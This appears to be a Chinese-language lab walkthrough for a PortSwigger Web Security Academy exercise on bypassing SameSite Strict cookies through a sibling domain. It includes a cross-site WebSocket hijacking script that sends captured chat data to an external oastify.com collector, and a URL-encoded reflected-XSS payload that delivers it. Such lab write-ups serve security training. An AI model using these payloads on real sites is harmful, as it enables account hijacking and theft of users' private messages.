

## 通过易受攻击的兄弟域名绕过 SameSite 限制

实验：通过同级域绕过 SameSite Strict
https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain

相关lab
WebSocket - 实验：跨站 WebSocket 劫持

此处拥有sanmesite的限制，于是跨站无法提交cookie


```html
<script>
const socket = new WebSocket('wss://0a3a00f903fe12b780c417c5002e0024.web-security-academy.net/chat');
socket.onopen = (event) => {
console.log('build');
socket.send('READY');
};
socket.onmessage = (event) => {
console.log('rec:', event.data);
fetch('https://pngqn8h00sbgbkwq8c3iv0k78yep2fq4.oastify.com', {
method: 'POST',
mode: 'no-cors',
body: event.data
});
};
socket.onclose = (event) => {
console.log('close');
};
</script>
```

示例解决方案：
对资源请求的响应为
Access-Control-Allow-Origin: https://cms-0a3a00f903fe12b780c417c5002e0024.web-security-academy.net
揭示了兄弟域

访问此兄弟域 
响应中的表单拥有反射XSS漏洞
在burp中切换方法为get，仍可实现

添加上面的WebSocket脚本，使用url编码
设置页面跳转到此同站但不同源的已被攻破的页面
```html
<script>
    document.location = 'https://cms-0a3a00f903fe12b780c417c5002e0024.web-security-academy.net/login?username=%3c%73%63%72%69%70%74%3e%0d%0a%63%6f%6e%73%74%20%73%6f%63%6b%65%74%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%27%77%73%73%3a%2f%2f%30%61%33%61%30%30%66%39%30%33%66%65%31%32%62%37%38%30%63%34%31%37%63%35%30%30%32%65%30%30%32%34%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%27%29%3b%0d%0a%73%6f%63%6b%65%74%2e%6f%6e%6f%70%65%6e%20%3d%20%28%65%76%65%6e%74%29%20%3d%3e%20%7b%0d%0a%63%6f%6e%73%6f%6c%65%2e%6c%6f%67%28%27%62%75%69%6c%64%27%29%3b%0d%0a%73%6f%63%6b%65%74%2e%73%65%6e%64%28%27%52%45%41%44%59%27%29%3b%0d%0a%7d%3b%0d%0a%73%6f%63%6b%65%74%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%28%65%76%65%6e%74%29%20%3d%3e%20%7b%0d%0a%63%6f%6e%73%6f%6c%65%2e%6c%6f%67%28%27%72%65%63%3a%27%2c%20%65%76%65%6e%74%2e%64%61%74%61%29%3b%0d%0a%66%65%74%63%68%28%27%68%74%74%70%73%3a%2f%2f%70%6e%67%71%6e%38%68%30%30%73%62%67%62%6b%77%71%38%63%33%69%76%30%6b%37%38%79%65%70%32%66%71%34%2e%6f%61%73%74%69%66%79%2e%63%6f%6d%27%2c%20%7b%0d%0a%6d%65%74%68%6f%64%3a%20%27%50%4f%53%54%27%2c%0d%0a%6d%6f%64%65%3a%20%27%6e%6f%2d%63%6f%72%73%27%2c%0d%0a%62%6f%64%79%3a%20%65%76%65%6e%74%2e%64%61%74%61%0d%0a%7d%29%3b%0d%0a%7d%3b%0d%0a%73%6f%63%6b%65%74%2e%6f%6e%63%6c%6f%73%65%20%3d%20%28%65%76%65%6e%74%29%20%3d%3e%20%7b%0d%0a%63%6f%6e%73%6f%6c%65%2e%6c%6f%67%28%27%63%6c%6f%73%65%27%29%3b%0d%0a%7d%3b%0d%0a%3c%2f%73%63%72%69%70%74%3e&password=a';
</script>
```

